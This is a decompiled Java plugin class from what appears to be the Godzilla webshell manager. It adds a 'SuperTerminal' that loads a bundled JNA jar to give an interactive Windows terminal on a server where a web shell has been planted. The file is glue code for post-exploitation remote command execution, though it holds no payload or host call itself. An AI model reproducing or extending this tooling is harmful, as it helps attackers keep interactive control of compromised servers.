/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.ui.ShellManage;
import core.ui.component.dialog.GOptionPane;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.SuperTerminal;
import shells.plugins.java.JarLoader;
import util.Log;
import util.functions;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="SuperTerminal", DisplayName="\u8d85\u7ea7\u7ec8\u7aef")
public class JSuperTerminal
extends SuperTerminal {
    private JarLoader jarLoader;

    @Override
    public RealCmd getRealCmd() {
        RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
        if (plugin != null) {
            return plugin;
        }
        GOptionPane.showMessageDialog(super.getView(), "\u672a\u627e\u5230HttpProxy\u63d2\u4ef6!", "\u63d0\u793a", 0);
        return null;
    }

    @Override
    public boolean winptyInit(String tmpCommand) throws Exception {
        boolean superRet = super.winptyInit(tmpCommand);
        try {
            if (this.jarLoader == null) {
                ShellManage shellManage = this.shellEntity.getFrame();
                this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
            }
        } catch (Exception e) {
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin JarLoader!");
            throw new RuntimeException("no find plugin JarLoader!");
        }
        if (superRet) {
            if (!this.jarLoader.hasClass("jna.pty4j.windows.WinPtyProcess") && !this.jarLoader.loadJar(functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("assets/GodzillaJna.jar")))) {
                Log.log("\u52a0\u8f7dGodzillaJna\u5931\u8d25", new Object[0]);
            }
            return true;
        }
        return superRet;
    }
}

